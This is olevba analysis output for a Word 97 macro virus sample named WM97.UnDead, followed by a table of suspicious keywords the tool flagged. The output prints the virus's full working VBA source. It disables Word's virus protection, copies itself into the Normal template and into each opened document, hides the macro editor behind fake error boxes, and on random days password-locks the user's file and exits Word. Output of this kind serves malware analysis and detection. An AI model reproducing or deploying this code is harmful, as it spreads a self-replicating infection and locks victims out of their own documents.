olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.DWMVCK1.g
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.DWMVCK1.g - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO UnDead.bas 
in file: ./Virus.MSWord.DWMVCK1.g - OLE stream: 'Macros/VBA/UnDead'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
Attribute AutoOpen.VB_Description = "[ UnDead Virus Team ]"
Attribute AutoOpen.VB_ProcData.VB_Invoke_Func = "Normal.Stupid.AutoOpen"
  On Error GoTo Stupid

  Payload

  
    Application.ScreenUpdating = False
    Application.DisplayAlerts = wdAlertsNone

    WordBasic.DisableAutoMacros 0
    Options.VirusProtection = False

    Set ActiveDoc = ActiveDocument
    Set GlobalDoc = NormalTemplate

    DocumentInstalled = False
    GlobalInstalled = False
        
    For I = 1 To ActiveDocument.VBProject.VBComponents.Count
        If ActiveDocument.VBProject.VBComponents(I).Name = "UnDead" Then
            DocumentInstalled = True
        End If
    Next

    For J = 1 To NormalTemplate.VBProject.VBComponents.Count
        If NormalTemplate.VBProject.VBComponents(J).Name = "UnDead" Then
            GlobalInstalled = True
        End If
    Next

    If DocumentInstalled = False Then
        Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="UnDead", Object:=wdOrganizerObjectProjectItems
        ActiveDoc.SaveAs FileName:=ActiveDoc.Name, FileFormat:=wdFormatTemplate
    End If

    If GlobalInstalled = False Then
        Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="UnDead", Object:=wdOrganizerObjectProjectItems
        Options.SaveNormalPrompt = False
    End If

  Application.DisplayAlerts = wdAlertsAll

Stupid:
End Sub


'------------------------------------------------------------
'Payload macro
'Annoys the user
'------------------------------------------------------------
Sub Payload()
Attribute Payload.VB_Description = "[ UnDead Virus Team ]"
Attribute Payload.VB_ProcData.VB_Invoke_Func = "Normal.Stupid.Payload"
  On Error Resume Next
  For B = 0 To 2
    Beep
  Next

W = Int(Rnd() * 7) + 1
T = Int(Rnd() * 2) + 1
If Day(Now()) = Int(Rnd() * 30) + 1 Or WeekDay(Now()) = W Then Hell
If Day(Now()) = Int(Rnd() * 30) + 1 Or WeekDay(Now()) = T Then Virus
WordBasic.FileSaveAs Format:=1
End Sub
Private Sub Hell()
Dim fp$
Dim fn$
fp$ = WordBasic.[Time$]()
fn$ = WordBasic.[FileName$]()
WordBasic.ToolsOptionsSave Password:=fp$, WritePassword:=fp$
WordBasic.MsgBox "oh no!!!, your file was infected by virus", "WM97.UnDead", 16
WordBasic.FileExit 1
End Sub
Private Sub Virus()
frmVirus.Show
End Sub
Sub ToolsMacro()
MsgBox "Error office97.dll", vbCritical, Title:="WM97.UnDead"
End Sub
Sub ViewVBCode()
MsgBox "Microsoft VBA", Title:="WM97.UnDead"
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |office97.dll        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

